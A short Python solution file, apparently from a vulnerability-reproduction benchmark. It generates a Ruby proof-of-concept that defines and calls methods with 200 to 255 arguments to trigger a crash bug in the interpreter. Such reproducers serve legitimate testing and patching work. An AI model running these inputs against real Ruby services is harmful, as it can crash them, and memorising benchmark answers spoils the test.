import os
import tarfile

class Solution:
    def solve(self, src_path: str) -> bytes:
        # Generate multiple candidate calls to increase chances of triggering the bug
        # without making the input too large.
        #
        # Strategy:
        # - Define methods with many required arguments (<= 255 to avoid potential limits)
        # - Call them with exactly that many arguments
        # - Use multiple sizes to be robust across versions
        #
        Ns = [200, 240, 255]

        parts = []
        for idx, N in enumerate(Ns):
            params = ",".join(f"a{i}" for i in range(N))
            args = ",".join("0" for _ in range(N))
            parts.append(f"def t{idx}({params}); nil; end\n")
            parts.append(f"t{idx}({args})\n")

        poc = "".join(parts)
        return poc.encode("utf-8")
